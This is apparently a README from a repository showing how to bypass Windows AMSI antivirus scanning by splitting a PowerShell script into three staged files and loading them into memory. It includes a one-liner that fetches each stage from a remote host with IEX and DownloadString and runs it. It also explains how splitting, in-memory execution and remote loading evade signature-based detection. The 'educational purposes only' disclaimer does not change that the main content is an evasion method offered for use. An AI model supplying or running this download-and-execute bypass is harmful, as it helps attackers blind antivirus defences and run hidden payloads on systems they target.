### AMSI Bypass Using Script Splitting and In-Memory Execution

This repository demonstrates a technique to bypass **AMSI (Antimalware Scan Interface)** by splitting a PowerShell script into multiple files and loading them into memory. This approach helps evade signature-based detection used by antivirus (AV) solutions.

#### Steps Performed:
1. **Code Development**:
   - Created a PowerShell script designed to bypass AMSI.
   - Split the script into three separate files: `stage_1.ps1`, `stage_2.ps1`, and `stage_3.ps1`.

2. **Script Execution**:
   - Used the `IEX` (Invoke-Expression) command to download and execute each script in memory:
     ```powershell
     IEX (New-Object System.Net.WebClient).DownloadString("http://IP/stage_1.ps1"); IEX (New-Object System.Net.WebClient).DownloadString("http://IP/stage_2.ps1"); IEX (New-Object System.Net.WebClient).DownloadString("http://IP/stage_3.ps1"); MagicBypass;
     ```
   - This method avoids writing malicious code to disk, making it harder for AV tools to detect.

3. **In-Memory Execution**:
   - By loading the scripts directly into memory, the bypass technique remains stealthy and effective against traditional file-based detection mechanisms.

#### Why This Works:
- **Script Splitting**: Dividing the code into smaller files helps evade signature-based detection, as the individual files may not match known malicious patterns.
- **In-Memory Execution**: Executing code in memory avoids leaving traces on disk, reducing the chances of detection by AV solutions.
- **Obfuscation**: The use of `IEX` and remote loading adds an additional layer of obfuscation.

**Disclaimer**: This technique is for educational purposes only and should be used responsibly in authorized environments.

**Reference**: https://github.com/V-i-x-x/AMSI-BYPASS
